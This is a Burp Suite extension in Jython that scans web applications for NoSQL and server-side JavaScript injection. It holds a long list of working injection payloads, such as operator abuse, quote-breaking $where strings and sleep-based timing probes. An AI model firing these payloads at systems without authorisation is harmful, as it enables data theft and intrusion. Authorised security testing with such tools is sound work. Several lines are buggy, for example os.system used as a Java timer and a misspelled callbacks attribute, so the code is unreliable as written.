from os import system
from burp import IBurpExtender
from burp import IScanIssue
from burp import IParameter
from burp import ITab
from burp import IHttpListener
from burp import IScannerInsertionPointProvider
from burp import IScannerCheck
from burp import IMessageEditorController
from burp import IBurpExtenderCallbacks
from burp import IExtensionHelpers
from java.io import PrintWriter;
from java.util import ArrayList;
from javax.swing import JScrollPane;
from javax.swing import JSplitPane;
from javax.swing import JTabbedPane;
from javax.swing import JTable;
from javax.swing.table import AbstractTableModel;
from threading import Lock


class BurpExtender(IExtensionHelpers,IBurpExtenderCallbacks,IBurpExtender, ITab, IHttpListener, IScanIssue, IParameter, IScannerInsertionPointProvider, IScannerCheck, IMessageEditorController, AbstractTableModel):
		
	#
	# Implement IBurpExtender
	#
	def __init__(self):
		self.ENABLE_EXPERIMENTAL_PAYLOADS = False
		self.EXTENSION_NAME = "Custom N0-SQLi -> NO+Em-N0+life"
		self.EXTENSION_AUTHOR = "Improved by: GiongfNef"
		self.EXTENSION_URL = "https://www.github.com/matrix/Burp-NoSQLiScanner"
		self.EXTENSION_VERSION = "2.0"
		self.INJ_TYPE_JSON = 0
		self.INJ_TYPE_JSON_ERROR = 1
		self.INJ_TYPE_URL_BODY = 2
		self.INJ_TYPE_URL_BODY_ERROR = 3
		self.INJ_TYPE_FUNC = 4
		self.INJ_TYPE_TIME = 6
		self.INJ_TYPE_MULTI = 8
		self.INJS_ALL = ArrayList()
		self.inj_errors = ArrayList()
		self.last_post_request_body = None
		
	# registerExtenderCallbacks
	def	registerExtenderCallbacks(self, callbacks):
		self._callbacks = callbacks
		self._helpers = callbacks.getHelpers()
		stdout = PrintWriter(callbacks.getStdout(), True)
		stderr = PrintWriter(callbacks.getStderr(), True)
		# Set extension's name
		callbacks.setExtensionName("N0-Em")

		# Create the log and a lock on which to synchronize when adding log entries
		self._log = ArrayList()
		self._lock = Lock()

		# Main split pane
		self._splitpane = JSplitPane(JSplitPane.VERTICAL_SPLIT)

		# Table of log entries
		logTable = Table(self)
		scrollPane = JScrollPane(logTable)
		self._splitpane.setLeftComponent(scrollPane)

		# Tabs with request/response viewers
		tabs = JTabbedPane()
		self._requestViewer = callbacks.createMessageEditor(self, False)
		self._responseViewer = callbacks.createMessageEditor(self, False)
		tabs.addTab("Request", self._requestViewer.getComponent())
		tabs.addTab("Response", self._responseViewer.getComponent())
		self._splitpane.setRightComponent(tabs)
		
		# Customize our UI components
		callbacks.customizeUiComponent(self._splitpane)
		callbacks.customizeUiComponent(logTable)
		callbacks.customizeUiComponent(scrollPane)
		callbacks.customizeUiComponent(tabs)
		
		# Add the custom tab to Burp's UI
		callbacks.addSuiteTab(self)
		
		# Register ourselves as an HTTP listener and custom Scanner Check
		callbacks.registerHttpListener(self)
		callbacks.registerScannerCheck(self)

		# Set our extension name & register ourselves as ScannerInsertionPointProvider
		callbacks.setExtensionName(self.EXTENSION_NAME)
		callbacks.registerScannerInsertionPointProvider(self)

		# Display number of payloads SQLi & lisence
		cntPayloads = self.loadNoSQLiPayloads()
		stdout.println(self.EXTENSION_NAME + " v" + self.EXTENSION_VERSION + " - Loaded " + str(cntPayloads) + " payload(s).")
		banner = (
				" /$$   /$$                   /$$$$$$$$              \n"
				"| $$$ | $$                  | $$_____/              \n"
				"| $$$$| $$  /$$$$$$         | $$       /$$$$$$/$$$$ \n"
				"| $$ $$ $$ /$$__  $$ /$$$$$$| $$$$$   | $$_  $$_  $$\n"
				"| $$  $$$$| $$  \ $$|______/| $$__/   | $$ \ $$ \ $$\n"
				"| $$\  $$$| $$  | $$        | $$      | $$ | $$ | $$\n"
				"| $$ \  $$|  $$$$$$/        | $$$$$$$$| $$ | $$ | $$\n"
				"|__/  \__/ \______/         |________/|__/ |__/ |__/\n"
				"               "+ self.EXTENSION_AUTHOR +"        \r\n\n"
				#"[+] Github:   " + self.EXTENSION_URL + "\n"
				"[+] Ref:  https://www.github.com/matrix/Burp-NoSQLiScanner \n"
				"                                                        \n"
				)         
		stdout.println(banner)
		return
	
	#
	# Implement Load NoSQLi payloads
	#

	def loadNoSQLiPayloads(self):

		#load payloads of NoSQL Error Message
		self.inj_errors.add("unknown operator")
		self.inj_errors.add("cannot be applied to a field")
		self.inj_errors.add("expression is invalid")
		self.inj_errors.add("has to be a string")
		self.inj_errors.add("must be a boolean")
		self.inj_errors.add("use &a with")
		self.inj_errors.add("JSInterpreterFailure")
		self.inj_errors.add("BadValue")
		self.inj_errors.add("MongoError")

		#load payloads of NoSQLi in parameter
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON, "{\"$eq\":\"1\"}", "{\"$lt\":\"1\"}", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON, "\"\"", None, None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON, "{\"$ne\":\"1\"}", None, None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON, "{\"$ne\":\"1\"}", "\"\"", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON, "{\"$eq\":\"1\"}", "{\"$ne\":\"1\"}", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON, "{\"$lt\":\"\"}", "{\"$gt\":\"\"}", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON, "{\"$exists\":false}", "{\"$exists\":true}", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON, "{\"$regex\":\".^\"}", "{\"$regex\":\".*\"}", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON, "{\"$where\":\"return false\"}", "{\"$where\":\"return true\"}", None))
		
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON_ERROR, "{\"$\":\"1\"}", None, self.inj_errors))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON_ERROR, "{\"$where\":\"1\"}", None, self.inj_errors))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON_ERROR, "{\"$regex\":\"*\"}", None, self.inj_errors)) # pymongo
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON_ERROR, "{\"$regex\":null}", None, self.inj_errors))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON_ERROR, "{\"$exists\":null}", None, self.inj_errors)) # mongoose
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON_ERROR, "{\"$a\":null}", None, self.inj_errors)) # mongoose
		
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON_ERROR, "{\"&\":\"1\"}", None, self.inj_errors))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON_ERROR, "{\"&where\":\"1\"}", None, self.inj_errors))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON_ERROR, "{\"&regex\":\"*\"}", None, self.inj_errors))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON_ERROR, "{\"&regex\":null}", None, self.inj_errors))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON_ERROR, "{\"&exists\":null}", None, self.inj_errors))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_JSON_ERROR, "{\"&a\":null}", None, self.inj_errors)) # mongoose

		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, "%5b%24eq%5d=1", "%5b%24ne%5d=1", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, "%5b%24lt%5d=", "%5b%24gt%5d=", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, "%5b%24exists%5d=false", "%5b%24exists%5d=true", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, "%5b%24regex%5d=.%5e", "%5b%24regex%5d=.*", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, "%5b%24where5d=return%20false", "%5b%24where5d=return%20true", None))
		
		#modify
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, "%5b%26eq%5d=1", "%5b%26ne%5d=1", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, "%5b%26lt%5d=", "%5b%26gt%5d=", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, "%5b%26exists%5d=false", "%5b%26exists%5d=true", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, "%5b%26regex%5d=.%5e", "%5b%26regex%5d=.*", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, "%5b%26where5d=return%20false", "%5b%26where5d=return%20true", None))
				#modify
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, "%7c%7c1==2", "%7c%7c1==1", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, "'%7c%7c'a'=='b", "'%7c%7c'a'=='a", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, "\\'%7c%7c'a'=='b", "\\'%7c%7c'a'=='a", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, "\\\'%7c%7c'a'=='b", "\\\'%7c%7c'a'=='a", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, "true,$where:'1==2'", "true,$where:'1==1'", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, ",$where:'1==2'", ",$where:'1==1'", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, "$where:'1==2'", "$where:'1==1'", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, "',$where:'1==2", "',$where:'1==1", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, "1,$where:'1==2'", "1,$where:'1==1'", None))

		#modify
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, "_security", "_all_docs", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY, "%5b%5d=_security", "%5b%5d=_all_docs", None))

		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY_ERROR, "%5b%24%5d=1", None, self.inj_errors))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY_ERROR, "%5b%24where%5d=1", None, self.inj_errors))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY_ERROR, "%5b%24regex%5d=*", None, self.inj_errors))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY_ERROR, "%5b%24regex%5d=null", None, self.inj_errors))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY_ERROR, "%5b%24exists%5d=null", None, self.inj_errors))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY_ERROR, "%5b%24a%5d=null", None, self.inj_errors))

		#modify
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY_ERROR, "%5b%26%5d=1", None, self.inj_errors))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY_ERROR, "%5b%26where%5d=1", None, self.inj_errors))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY_ERROR, "%5b%26regex%5d=*", None, self.inj_errors))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY_ERROR, "%5b%26regex%5d=null", None, self.inj_errors))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY_ERROR, "%5b%26exists%5d=null", None, self.inj_errors))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY_ERROR, "%5b%26a%5d=null", None, self.inj_errors))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY_ERROR, "'", None, self.inj_errors))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_URL_BODY_ERROR, "\\'", None, self.inj_errors))

		
		#modify
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_FUNC, "';return 'a'=='b' && ''=='", "';return 'a'=='a' && ''=='", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_FUNC, "\\';return 'a'=='b' && ''=='", "\\';return 'a'=='a' && ''=='", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_FUNC, "\\\';return 'a'=='b' && ''=='", "\\\';return 'a'=='a' && ''=='", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_FUNC, "\";return 'a'=='b' && ''=='", "\";return 'a'=='b' && ''=='", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_FUNC, "\\\";return 'a'=='b' && ''=='", "\\\";return 'a'=='b' && ''=='", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_FUNC, "\";return(false);var xyz='a", "\";return(true);var xyz='a", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_FUNC, "';return(false);var xyz='a", "';return(true);var xyz='a", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_FUNC, "\\';return(false);var xyz='a", "\\';return(true);var xyz='a", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_FUNC, "a';return false;var xyz='a", "a';return true;var xyz='a", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_FUNC, "a\\';return false;var xyz='a", "a\\';return true;var xyz='a", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_FUNC, "a\";return true;var xyz=\"a", "a\";return false; var xyz=\"a", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_FUNC, "0;return false", "0;return true", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_FUNC, "require('os').endianness()=='LE'", "require('os').endianness()=='BE'", None)) # node.js
		
		#modify
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_MULTI, "%5b%24eq%5d=1", "%5b%24ne%5d=1", None))
		self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_MULTI, "%5b%26eq%5d=1", "%5b%26ne%5d=1", None))

		if self.ENABLE_EXPERIMENTAL_PAYLOADS:
			self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_TIME, "{\"$where\":\"sleep(1)\"}", "{\"$where\":\"sleep(10000)\"}", None))
			self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_TIME, "{\"&where\":\"sleep(1)\"}", "{\"&where\":\"sleep(10000)\"}", None))
			self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_TIME, "$where:\"sleep(1)\"", "$where:\"sleep(10000)\"", None))
			self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_TIME, "$where:'sleep(1)'", "$where:'sleep(10000)'", None))
			self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_TIME, "sleep(1)", "sleep(10000)", None))
			self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_TIME, "a;sleep(1)", "a;sleep(10000)", None))
			self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_TIME, "'a';sleep(1)", "'a';sleep(10000)", None))
			self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_TIME, "a';sleep(1);var xyz='a", "a';sleep(10000);var xyz='a", None))
			self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_TIME, "';sleep(1);var xyz='0", "';sleep(10000);var xyz='0", None))
			self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_TIME, "\\';sleep(1);var xyz='0", "\\';sleep(10000);var xyz='0", None))
			self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_TIME, "var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz=1", "var d=new Date();do{var cd=new Date();}while(cd-d<10000);var xyz=1", None))
			self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_TIME, "1;var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz=1", "1;var d=new Date();do{var cd=new Date();}while(cd-d<10000);var xyz=1", None))
			self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_TIME, "1';var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz='1", "1';var d=new Date();do{var cd=new Date();}while(cd-d<10000);var xyz='1", None))
			self.INJS_ALL.add(NoSQLiPayload(self.INJ_TYPE_TIME, "1\\';var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz='1", "1\\';var d=new Date();do{var cd=new Date();}while(cd-d<10000);var xyz='1", None))

		return len(self.INJS_ALL)
	
	# Search all occurrences of match in response 
	def getMatches(self, response, match):
		matches = ArrayList()
		start = 0
		while start < len(response):
			start = self._helpers.indexOf(response, match, False, start, len(response))
			if start == -1:
				break
			matches.add([start, start + len(match)])
			start += len(match)
		return matches

	# Make Scanner Insertion Point
	def getInsertionPoints(self, baseRequestResponse):
		insertionPoints = ArrayList()
		request = baseRequestResponse.getRequest()
		requestStr = self._helpers.bytesToString(request)
		reqInfo = self._helpers.analyzeRequest(request)

		for p in reqInfo.getParameters():
			# handle json parameter
			if p.getType() == IParameter.PARAM_JSON:
				start = p.getValueStart()
				s = requestStr[start - 1]
				if s == '"':
					start -= 1
				end = p.getValueEnd()
				e = requestStr[end]
				if e == '"':
					end += 1

				insertionPoints.add(self._helpers.makeScannerInsertionPoint(self.EXTENSION_NAME, request, start, end))  # add custom json injection point
			
			# handle parameter within the message body
			elif p.getType() == IParameter.PARAM_BODY or p.getType() == IParameter.PARAM_URL: 
				start = p.getNameEnd()
				s = requestStr[start]
				end = p.getValueEnd()

				insertionPoints.add(self._helpers.makeScannerInsertionPoint(self.EXTENSION_NAME, request, start, end))  # add custom urlencoded injection point
			
			else:
				continue

			insertionPoints.add(self._helpers.makeScannerInsertionPoint(self.EXTENSION_NAME, request, p.getValueStart(), p.getValueEnd()))  # add default insertion point

		return insertionPoints
	
	#do PassiveScan scan check
	def doPassiveScan(self, baseRequestResponse):
		issues = ArrayList()
		response = baseRequestResponse.getResponse()

		if len(response) == 0:
			return issues
		for e in self.INJS_ALL:
			if e.get_err() is not None and len(e.get_err()) > 0:
				it = e.get_err().iterator()

				while it.hasNext():
					err = it.next()

					matches = self.getMatches(response, err.encode())

					if len(matches) > 0:
						# report the issue
						issues.add(
							CustomScanIssue(
								baseRequestResponse.getHttpService(),
								self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
								[self.callbacks.applyMarkers(baseRequestResponse, None, matches)],
								"NoSQL Error Message Detected",
								"The response contains the string: " + err,
								"Medium",
								"Certain"
							)
						)
						break  # stop at the first error message detected

		return issues

	#doActiveScan scan check
	def doActiveScan(self, baseRequestResponse, insertionPoint):
		issues = ArrayList()

		for e in self.INJS_ALL:
			checkRequestResponse = [None, None]
			variation = None

			whole_body_content = False
			limited_body_content = False
			status_code = False

			DigYourOwnHole = [False, False, False]
			DigYourOwnHole_cnt = 0

			timer = [0, 0, 0]
			timerCheck = [0, 0]

			if e.get_payloadType() != self.INJ_TYPE_JSON_ERROR and e.get_payloadType() != self.INJ_TYPE_URL_BODY_ERROR:
				
				#Take payload1, payload2 from NoSQLi payload
				checkRequest1 = insertionPoint.buildRequest(e.get_payload_1())
				checkRequest2 = insertionPoint.buildRequest(e.get_payload_2())

				if e.get_payloadType() == self.INJ_TYPE_TIME:
					timer[0] = system.currentTimeMillis()
				#Response of payload1
				checkRequestResponse[0] = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest1)
				
				if e.get_payloadType() == self.INJ_TYPE_TIME:
					timer[1] = system.currentTimeMillis()
				#Response of payload2
				checkRequestResponse[1] = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest2)
				
				if e.get_payloadType() == self.INJ_TYPE_TIME:
					timer[2] = system.currentTimeMillis()

				if e.get_payloadType() == self.INJ_TYPE_TIME:
					timerCheck[0] = timer[1] - timer[0]
					timerCheck[1] = timer[2] - timer[1]
					timerDiff = abs(timerCheck[1] - timerCheck[0])

					if timerDiff >= 10000:
						issues.add(
							CustomScanIssue(
								baseRequestResponse.getHttpService(),
								self.callbacks._helpers.analyzeRequest(baseRequestResponse).getUrl(),
								[baseRequestResponse, checkRequestResponse[0], checkRequestResponse[1]],
								"NoSQL/SSJI Time-Based Injection Detected",
								"Injection found by using the following payloads:\n\t" + self._callbacks._helpers.bytesToString(e.get_payload_1()) + "\nand\n\t" + self._helpers.bytesToString(e.get_payload_2()) + ".\nThe timing diff was: " + str(timerDiff) + ".",
								"High",
								"Tentative"
							)
						)

				#variation betweent responses of payload1 and payload2
				variation = self._helpers.analyzeResponseVariations(checkRequestResponse[0].getResponse(), checkRequestResponse[1].getResponse())
				responseChanges = variation.getVariantAttributes()
				
				#Check the changes and 3 type of changes
				for change in responseChanges:
					if change == "whole_body_content":
						whole_body_content = True
					if change == "limited_body_content":
						limited_body_content = True
					if change == "status_code":
						status_code = True

				#True if exits 1 in 3 changes
				DigYourOwnHole[0] = (whole_body_content or limited_body_content or status_code)

				#Count the changes
				DigYourOwnHole_cnt = (1 if whole_body_content else 0) + (1 if limited_body_content else 0) + (1 if status_code else 0)

				#Issues when responses are change and count enough 3 types
				if DigYourOwnHole[0] and DigYourOwnHole_cnt == 3:
					issues.add(
						CustomScanIssue(
							baseRequestResponse.getHttpService(),
							self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
							[baseRequestResponse, checkRequestResponse[0], checkRequestResponse[1]],
							(("NoSQL/SSJI" if e.get_payloadType() == self.INJ_TYPE_FUNC else "NoSQL") + " Injection Detected"),
							("Injection found, detected by variation in responses, by using the following payloads: " + self._helpers.bytesToString(e.get_payload_1()) + " and " + self._helpers.bytesToString(e.get_payload_2())),
							"High",
							"Tentative"
						)
					)

				#Issues when responses are change
				elif DigYourOwnHole[0]:
					whole_body_content = limited_body_content = status_code = False
					#variantion betweent request in Instruder and payload1 (1)
					variation = self._helpers.analyzeResponseVariations(baseRequestResponse.getResponse(), checkRequestResponse[0].getResponse())
					responseChanges = variation.getVariantAttributes()
					for change in responseChanges:
						if change == "whole_body_content":
							whole_body_content = True
						if change == "limited_body_content":
							limited_body_content = True
						if change == "status_code":
							status_code = True

					DigYourOwnHole[1] = (whole_body_content or limited_body_content or status_code)

					whole_body_content = limited_body_content = status_code = False

					#variantion betweent request in Instruder and payload2 (2)
					variation = self._helpers.analyzeResponseVariations(baseRequestResponse.getResponse(), checkRequestResponse[1].getResponse())
					responseChanges = variation.getVariantAttributes()
					for change in responseChanges:
						if change == "whole_body_content":
							whole_body_content = True
						if change == "limited_body_content":
							limited_body_content = True
						if change == "status_code":
							status_code = True

					DigYourOwnHole[2] = (whole_body_content or limited_body_content or status_code)

					check_variation = (DigYourOwnHole[1] != DigYourOwnHole[2])

					#Issues when variation betweent (1) and (2)
					if check_variation:
						issues.add(
							CustomScanIssue(
								baseRequestResponse.getHttpService(),
								self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
								[baseRequestResponse, checkRequestResponse[0], checkRequestResponse[1]],
								(("NoSQL/SSJI" if e.get_payloadType() == self.INJ_TYPE_FUNC else "NoSQL") + " Injection Detected"),
								("Injection found, detected by variation in responses, by using the following payloads: " + self._helpers.bytesToString(e.get_payload_1()) + " and " + self._helpers.bytesToString(e.get_payload_2())),
								"High",
								"Tentative"
							)
						)
			else:
				#if response has error pattern in response, alert NOSQLi message error
				if e.get_err() is not None and len(e.get_err()) > 0:
					checkRequest = insertionPoint.buildRequest(e.get_payload_1())
					checkRequestResponse[0] = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest)

					response = checkRequestResponse[0].getResponse()

					if len(response) > 0:
						it = e.get_err().iterator()
						for error in self.inj_errors:
							#print(error)
							matches = self.getMatches(response, error.encode())
							if len(matches) > 0:
								issues.add(
									CustomScanIssue(
										baseRequestResponse.getHttpService(),
										self._helpers.analyzeRequest(checkRequestResponse[0]).getUrl(),
										[self._callbacks.applyMarkers(checkRequestResponse[0], None, matches)],
										"NoSQL Error Message Detected",
										"The response contains the string: " + error.encode(),
										"Medium",
										"Certain"
									)
								)
						# while it.hasNext():
						# 	err = it.next()
						# 	print("it.hasNext(): ",it.hasNext())
						# 	print("err: ", err)
						# 	matches = self.getMatches(response, err.getBytes())

						# 	if len(matches) > 0:
						# 		# report the issue
						# 		issues.add(
						# 			CustomScanIssue(
						# 				baseRequestResponse.getHttpService(),
						# 				self._helpers.analyzeRequest(checkRequestResponse[0]).getUrl(),
						# 				[self._callbacks.applyMarkers(checkRequestResponse[0], None, matches)],
						# 				"NoSQL Error Message Detected",
						# 				"The response contains the string: " + err,
						# 				"Medium",
						# 				"Certain"
						# 			)
						# 		)
						# 		break  # stop at the first error message detected
							
							
			#self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequestbonus)
		return issues
	
	#Compares the names of two issues
	def consolidateDuplicateIssues(self, existingIssue, newIssue):
		return -1 if existingIssue.getIssueName() == newIssue.getIssueName() else 0

	
	#
	# implement ITab
	#
	
	def getTabCaption(self):
		return "NoSQLi Logger"
	
	def getUiComponent(self):
		return self._splitpane
		
	#
	# implement IHttpListener
	#
	
	def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
		# Only process requests from the active scanner (not responses or other tools)
		if  messageIsRequest :
			return
		
		# Log only displays payloads of NOSQLi 
		if toolFlag == IBurpExtenderCallbacks.TOOL_EXTENDER:
			request_info = self._helpers.analyzeRequest(messageInfo)
			request_body = messageInfo.getRequest()[request_info.getBodyOffset():]
			response_info = self._helpers.analyzeResponse(messageInfo.getResponse())
			status_code = response_info.getStatusCode()
			# Create a new log entry with the message details
			self._lock.acquire()
			row = self._log.size()
			self._log.add(LogEntry(toolFlag, self._callbacks.saveBuffersToTempFiles(messageInfo), self._helpers.analyzeRequest(messageInfo).getUrl(),self._helpers.bytesToString(request_body),status_code))
			self.fireTableRowsInserted(row, row)
			self._lock.release()
	
	#Display log
	def getRowCount(self):
		try:
			return self._log.size()
		except:
			return 0

	def getColumnCount(self):
		return 3

	def getColumnName(self, columnIndex):
		if columnIndex == 0:
			return "Endpoint"
		if columnIndex == 1:
			return "Payloads"
		if columnIndex == 2:
			return "Status code"
		return ""
	
	def getValueAt(self, rowIndex, columnIndex):
		logEntry = self._log.get(rowIndex)

		if columnIndex == 0:
			return logEntry._url.toString()
		if columnIndex == 1:
			return logEntry._request
		if columnIndex == 2:
			return logEntry._status_code
		return ""

	#
	# implement IMessageEditorController
	# this allows our request/response viewers to obtain details about the messages being displayed
	#
	
	def getHttpService(self):
		return self._currentlyDisplayedItem.getHttpService()

	def getRequest(self):
		return self._currentlyDisplayedItem.getRequest()

	def getResponse(self):
		return self._currentlyDisplayedItem.getResponse()
	


#
# extend JTable to handle cell selection
#
	
class Table(JTable):
	def __init__(self, extender):
		self._extender = extender
		self.setModel(extender)
	
	def changeSelection(self, row, col, toggle, extend):
	
		# show the log entry for the selected row
		logEntry = self._extender._log.get(row)
		self._extender._requestViewer.setMessage(logEntry._requestResponse.getRequest(), True)
		self._extender._responseViewer.setMessage(logEntry._requestResponse.getResponse(), False)
		self._extender._currentlyDisplayedItem = logEntry._requestResponse
		
		JTable.changeSelection(self, row, col, toggle, extend)
	
#
# class to hold details of each log entry
#

class LogEntry:
	def __init__(self, tool, requestResponse, url, request, status_code):
		self._tool = tool
		self._requestResponse = requestResponse
		self._url = url
		self._request = request
		self._status_code = status_code


#
# class implementing IScanIssue to hold our custom scan issue details
#
class CustomScanIssue (IScanIssue):
	def __init__(self, httpService, url, httpMessages, name, detail, severity, confidence):
		self._httpService = httpService
		self._url = url
		self._httpMessages = httpMessages
		self._name = name
		self._detail = detail
		self._severity = severity
		self._confidence = confidence

	def getUrl(self):
		return self._url

	def getIssueName(self):
		return self._name

	def getIssueType(self):
		return 0

	def getSeverity(self):
		return self._severity

	def getConfidence(self):
		return self._confidence

	def getIssueBackground(self):
		pass

	def getRemediationBackground(self):
		pass

	def getIssueDetail(self):
		return self._detail

	def getRemediationDetail(self):
		pass

	def getHttpMessages(self):
		return self._httpMessages

	def getHttpService(self):
		return self._httpService

# NOSQLi payload
class NoSQLiPayload:
	def __init__(self, t, p1, p2, err):
		self.payloadType = t
		self.payload_1 = None
		self.payload_2 = None
		self.set_payloads(p1, p2)
		self.err = err

	def get_payloadType(self):
		return self.payloadType

	def get_payload_1(self):
		return self.payload_1 if self.payload_1 is not None else bytearray()

	def get_payload_2(self):
		return self.payload_2 if self.payload_2 is not None else bytearray()

	def get_err(self):
		return self.err

	def set_payloads(self, p1, p2):
		if p1 is not None and len(p1) > 0:
			self.payload_1 = p1.encode()
		if p2 is not None and len(p2) > 0:
			self.payload_2 = p2.encode()